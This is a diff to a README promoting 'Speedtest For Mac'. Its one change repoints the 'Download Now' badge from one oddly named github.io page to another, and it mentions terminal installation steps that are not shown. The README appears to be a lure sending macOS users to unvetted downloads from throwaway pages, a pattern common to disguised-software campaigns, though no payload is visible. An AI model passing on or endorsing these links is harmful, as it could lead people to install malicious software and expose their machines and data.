@@ -3,7 +3,7 @@
 
 Effortlessly measure your internet speed with Speedtest For Mac. Follow the simple instructions below to install this lightweight, user-friendly tool on your macOS device and optimize your network performance.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/speedtest)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/speedtest)
 
 If the download button doesn't work, follow the terminal instructions below for a seamless installation.
 
